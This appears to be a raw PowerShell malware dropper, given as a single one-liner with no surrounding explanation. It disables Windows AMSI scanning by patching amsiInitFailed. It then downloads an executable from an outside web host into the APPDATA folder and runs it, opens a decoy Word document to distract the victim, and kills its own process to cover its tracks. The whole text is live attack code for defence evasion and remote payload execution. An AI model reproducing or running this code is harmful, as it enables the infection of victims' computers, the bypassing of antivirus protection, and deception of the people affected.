[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true); $file = $env:APPDATA + '\FU1.exe';$nwPath = $env:APPDATA + '\VI5.doc';If (test-path $file) {Remove-Item $file} If (test-path $nwPath) {Remove-Item $nwPath} $coma = New-Object System.Net.WebClient; $coma.Headers['User-Agent'] = 'who-nop'; $coma.DownloadFile('http://lalecitinadesoja.com/imagenesdeunasdisenos.com/ago.exe', $file); $coma.DownloadFile('http://www.iiswc.org/iiswc2009/sample.doc', $nwPath); (New-Object -com Shell.Application).ShellExecute($file); Stop-Process -processname WINWORD;Start-Process -FilePath $nwPath;Stop-Process -Id $Pid -Force
